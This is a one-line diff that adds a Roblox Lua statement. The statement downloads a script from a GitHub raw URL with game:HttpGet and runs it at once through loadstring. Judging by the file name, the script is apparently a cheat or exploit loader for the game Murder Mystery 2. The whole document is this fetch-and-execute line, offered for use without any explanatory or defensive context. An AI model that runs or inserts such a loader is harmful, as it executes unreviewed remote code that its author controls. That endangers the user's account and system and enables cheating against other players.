@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/murder-mystery-2-spam7-nb5v0eb5oe6gtg.lua"))()
